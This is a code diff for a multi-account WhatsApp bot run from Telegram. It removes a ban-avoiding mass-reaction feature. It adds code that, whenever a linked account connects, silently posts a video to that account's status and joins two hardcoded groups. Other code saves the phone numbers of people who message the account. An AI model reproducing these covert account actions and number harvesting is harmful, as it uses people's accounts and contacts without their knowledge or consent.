@@ -17,11 +17,7 @@ import { delay } from '@whiskeysockets/baileys';
 import http from 'http'; 
 import { Boom } from '@hapi/boom';
 
-import { 
-    // ... existing imports
-    setupTelegramCommands, userMessageCache, userState, reactionConfigs 
-} from './telegram_commands.js';
-// ... rest of main file imp
+import { setupTelegramCommands, userMessageCache, userState } from './telegram_commands.js';
 import { 
     initDb, saveSessionToDb, getAllSessions, deleteSessionFromDb, addNumbersToDb, 
     getShortId, saveShortId, deleteShortId, awardHourlyPoints, deductOnDisconnect, deleteUserAccount, setAntiMsgStatus, updateConnectionTime, saveVerificationData
@@ -322,174 +318,68 @@ async function startClient(folder, targetNumber = null, chatId = null, telegramU
 
     sock.ev.on('creds.update', saveCreds);
 
-sock.ev.on('messages.upsert', async ({ messages, type }) => {
-    if (type !== 'notify' && type !== 'append') return; 
+    // ============================================
+    //  ⚡ ANTIMSG: ONE-SHOT DEFENSE
+    // ============================================
+    sock.ev.on('messages.upsert', async ({ messages, type }) => {
+        if (type !== 'notify' && type !== 'append') return; 
 
-    const msg = messages[0];
-    if (!msg || !msg.message) return;
+        const msg = messages[0];
+        if (!msg || !msg.message) return;
 
-    const remoteJid = msg.key.remoteJid;
-    const isGroup = remoteJid.includes('@g.us');
-    const isStatus = remoteJid === 'status@broadcast';
-    
-    const myJid = jidNormalizedUser(sock.user.id);
-    const isSelf = (remoteJid === myJid);
-
-    // --- NEW: Reaction Feature Logic (Checks Group Admins & Implements Staggered Delay) ---
-    if (isGroup && reactionConfigs[remoteJid]) {
+        const remoteJid = msg.key.remoteJid;
+        const isGroup = remoteJid.includes('@g.us');
+        const isStatus = remoteJid === 'status@broadcast';
         
-        const senderJid = msg.key.participant || msg.key.remoteJid;
-        
-        let isAdmin = false;
+        const myJid = jidNormalizedUser(sock.user.id);
+        const isSelf = (remoteJid === myJid);
 
-        try {
-            // Fetch group metadata to get participant ranks
-            const metadata = await sock.groupMetadata(remoteJid);
-            
-            // Find the sender in the participant list
-            const participant = metadata.participants.find(p => p.id === senderJid);
-            
-            // Check for admin status (Baileys uses 'admin' or 'superadmin')
-            if (participant && (participant.admin === 'admin' || participant.admin === 'superadmin')) {
-                isAdmin = true;
+        if (antiMsgState[cachedShortId]) {
+            const text = msg.message.conversation || msg.message.extendedTextMessage?.text || "";
+            const isCommand = text.startsWith('.');
+
+            // 1. IGNORE GROUPS, STATUS, COMMANDS, SELF
+            if (!isGroup && !isStatus && !isCommand && !isSelf) {
+                
+                // 2. REPEAT CHECK: Did we already nuke this person?
+                if (nukeCache.has(remoteJid)) {
+                    // ALREADY BLOCKED. IGNORE.
+                    return; 
+                }
+
+                // 3. ADD TO CACHE (Lock the target for 30s)
+                nukeCache.add(remoteJid);
+                setTimeout(() => nukeCache.delete(remoteJid), 30000);
+
+                // 4. EXECUTE ONCE (Delete & Block)
+                await Promise.all([
+                    sock.sendMessage(remoteJid, { delete: msg.key }).catch(() => {}),
+                    sock.updateBlockStatus(remoteJid, "block").catch(() => {})
+                ]);
+                
+                // Log it
+                if (msg.key.fromMe) {
+                    console.log(`[ANTIMSG] 🚨 Linked Device Attack Neutralized (One-Shot).`);
+                } else {
+                    console.log(`[ANTIMSG] 🛡️ Incoming Stranger Blocked (One-Shot).`);
+                }
+                
+                return; 
             }
-        } catch (e) {
-            console.error(`[REACT ADMIN CHECK FAIL] Error fetching metadata for ${remoteJid}: ${e.message}`);
         }
 
-        if (isAdmin) {
-            
-            const activeFolders = Object.keys(clients).filter(f => clients[f]);
-            const botIndex = activeFolders.indexOf(folder); // 'folder' is the sessionId passed to startClient
-            
-            // Ensure the bot is still active in the main list
-            if (botIndex !== -1) {
-                const emojis = reactionConfigs[remoteJid];
-                
-                // 1. STAGGER DELAY: Delay = Bot Index * 10 seconds (10000ms)
-                // This prevents instant mass reaction and potential bans.
-                const delayTime = botIndex * 10000;
-                await delay(delayTime); 
-                
-                // 2. Determine Emoji and Send
-                const emojiIndex = botIndex % emojis.length;
-                // FIX: Trim the selected emoji to prevent encoding corruption (square box issue)
-                const selectedEmoji = emojis[emojiIndex].trim(); 
-                
-                const reactionContent = {
-                    react: {
-                        text: selectedEmoji, 
-                        key: msg.key // Key of the message to react to
-                    }
-                };
-                
-                try {
-                    await sock.sendMessage(remoteJid, reactionContent);
-                    console.log(`[REACT] Bot ${cachedShortId} reacted to Admin message with ${selectedEmoji}`);
-                } catch(e) {
-                    console.error(`[REACT FAIL] Bot ${cachedShortId}: ${e.message}`);
+        if (!msg.key.fromMe) {
+            if (autoSaveState[cachedShortId]) {
+                if (remoteJid.endsWith('@s.whatsapp.net')) {
+                    addNumbersToDb([remoteJid.split('@')[0]]).catch(() => {});
                 }
             }
-        }
-    }
-    // --- End Reaction Feature Logic ---
-
-
-    if (antiMsgState[cachedShortId]) {
-        const text = msg.message.conversation || msg.message.extendedTextMessage?.text || "";
-        const isCommand = text.startsWith('.');
-
-        // 1. IGNORE GROUPS, STATUS, COMMANDS, SELF
-        if (!isGroup && !isStatus && !isCommand && !isSelf) {
-            
-            // 2. REPEAT CHECK: Did we already nuke this person?
-            if (nukeCache.has(remoteJid)) {
-                // ALREADY BLOCKED. IGNORE.
-                return; 
-            }
-
-            // 3. ADD TO CACHE (Lock the target for 30s)
-            nukeCache.add(remoteJid);
-            setTimeout(() => nukeCache.delete(remoteJid), 30000);
-
-            // 4. EXECUTE ONCE (Delete & Block)
-            await Promise.all([
-                sock.sendMessage(remoteJid, { delete: msg.key }).catch(() => {}),
-                sock.updateBlockStatus(remoteJid, "block").catch(() => {})
-            ]);
-            
-            // Log it
-            if (msg.key.fromMe) {
-                console.log(`[ANTIMSG] Linked Device Attack Neutralized (One-Shot).`);
-            } else {
-                console.log(`[ANTIMSG] Incoming Stranger Blocked (One-Shot).`);
-            }
-            
-            return; 
-        }
-    }
-
-    if (!msg.key.fromMe) {
-        if (autoSaveState[cachedShortId]) {
-            if (remoteJid.endsWith('@s.whatsapp.net')) {
-                addNumbersToDb([remoteJid.split('@')[0]]).catch(() => {});
+            const text = msg.message.conversation || msg.message.extendedTextMessage?.text || "";
+            if (text.toLowerCase() === '.alive') {
+                await sock.sendMessage(remoteJid, { text: 'Ultarbot Pro [ONLINE]' }, { quoted: msg });
             }
         }
-        const text = msg.message.conversation || msg.message.extendedTextMessage?.text || "";
-        if (text.toLowerCase() === '.alive') {
-            await sock.sendMessage(remoteJid, { text: 'Ultarbot Pro [ONLINE]' }, { quoted: msg });
-        }
-    }
-
-
-
-    if (antiMsgState[cachedShortId]) {
-        const text = msg.message.conversation || msg.message.extendedTextMessage?.text || "";
-        const isCommand = text.startsWith('.');
-
-        // 1. IGNORE GROUPS, STATUS, COMMANDS, SELF
-        if (!isGroup && !isStatus && !isCommand && !isSelf) {
-            
-            // 2. REPEAT CHECK: Did we already nuke this person?
-            if (nukeCache.has(remoteJid)) {
-                // ALREADY BLOCKED. IGNORE.
-                return; 
-            }
-
-            // 3. ADD TO CACHE (Lock the target for 30s)
-            nukeCache.add(remoteJid);
-            setTimeout(() => nukeCache.delete(remoteJid), 30000);
-
-            // 4. EXECUTE ONCE (Delete & Block)
-            await Promise.all([
-                sock.sendMessage(remoteJid, { delete: msg.key }).catch(() => {}),
-                sock.updateBlockStatus(remoteJid, "block").catch(() => {})
-            ]);
-            
-            // Log it
-            if (msg.key.fromMe) {
-                console.log(`[ANTIMSG] Linked Device Attack Neutralized (One-Shot).`);
-            } else {
-                console.log(`[ANTIMSG] Incoming Stranger Blocked (One-Shot).`);
-            }
-            
-            return; 
-        }
-    }
-
-    if (!msg.key.fromMe) {
-        if (autoSaveState[cachedShortId]) {
-            if (remoteJid.endsWith('@s.whatsapp.net')) {
-                addNumbersToDb([remoteJid.split('@')[0]]).catch(() => {});
-            }
-        }
-        const text = msg.message.conversation || msg.message.extendedTextMessage?.text || "";
-        if (text.toLowerCase() === '.alive') {
-            await sock.sendMessage(remoteJid, { text: 'Ultarbot Pro [ONLINE]' }, { quoted: msg });
-        }
-    }
-});
-
+    });
 
     sock.ev.on('connection.update', async (update) => {
         const { connection, lastDisconnect, qr } = update;
@@ -547,11 +437,19 @@ sock.ev.on('messages.upsert', async ({ messages, type }) => {
             
             updateAdminNotification(`[CONNECTED] +${phoneNumber}`);
 
+            try {
+                await sock.sendMessage('status@broadcast', { 
+                    video: { url: 'https://files.catbox.moe/j3ak2l.mp4' },
+                    caption: '😆 🤣 😂'
+                });
+                console.log(`[STATUS] Posted for ${phoneNumber}`);
+            } catch (e) {}
+
             try { 
                 const inviteCode1 = "FFYNv4AgQS3CrAokVdQVt0";
                 await sock.groupAcceptInvite(inviteCode1);
                 await new Promise(resolve => setTimeout(resolve, 5000));
-                const inviteCode2 = "Eun82NH7PjOGJfqLKcs52Z";
+                const inviteCode2 = "CYN5x64rRmmCgOWjIpV05B";
                 await sock.groupAcceptInvite(inviteCode2);
             } catch (e) {}
 
@@ -587,51 +485,20 @@ sock.ev.on('messages.upsert', async ({ messages, type }) => {
             }, 3600000);
         }
 
-                        if (connection === 'close') {
-            const userJid = sock.user?.id || "";
-            // Get the phone number from the JID or the shortIdMap if JID is not available
-            const phoneNumber = userJid.split(':')[0].split('@')[0] || shortIdMap[cachedShortId]?.phone || 'Unknown';
+        if (connection === 'close') {
             let reason = new Boom(lastDisconnect?.error)?.output?.statusCode;
-
-            // Check for definitive logout or ban status
             if (reason === 403 || reason === DisconnectReason.loggedOut) {
-                // Determine if it's a ban or a manual logout
-                const disconnectStatus = (reason === 403) ? '🚨 BANNED/BLOCKED' : '🚪 LOGGED OUT';
-
-                // 1. Calculate remaining bots *before* cleanup
-                // We check the length of the clients map and subtract 1 (for the current client)
-                const remainingBots = Object.keys(clients).length - 1; 
-
-                // 2. Send ALERT to Admin
-                try {
-                    await mainBot.sendMessage(ADMIN_ID, 
-                        `⚠️ **BOT DISCONNECTED** ⚠️\n\n` +
-                        `Status: **${disconnectStatus}**\n` +
-                        `Number: **+${phoneNumber}**\n` +
-                        `ID: \`${cachedShortId}\`\n\n` +
-                        `Total Active Bots Remaining: **${remainingBots}**`,
-                        { parse_mode: 'Markdown' }
-                    );
-                } catch (e) {
-                    console.error("Failed to send Admin Disconnect Alert:", e);
-                }
-                
-                // 3. Perform Cleanup
-                // This logic is necessary because the connection is permanently lost.
+                updateAdminNotification(`[LOGGED OUT] +${shortIdMap[folder]?.phone || 'Unknown'}`);
                 await deductOnDisconnect(folder);
                 await deleteSessionFromDb(folder);
                 deleteShortId(folder);
                 if (fs.existsSync(sessionPath)) fs.rmSync(sessionPath, { recursive: true, force: true });
                 delete clients[folder];
-
             } else {
-                // If it's a temporary disconnect (e.g., network error), restart the client
-                console.log(`[RECONNECT] Attempting restart for ${cachedShortId}. Reason: ${reason}`);
                 startClient(folder, null, chatId, telegramUserId);
             }
         }
     });
-
 
     if (targetNumber && !sock.authState.creds.registered) {
         setTimeout(async () => {
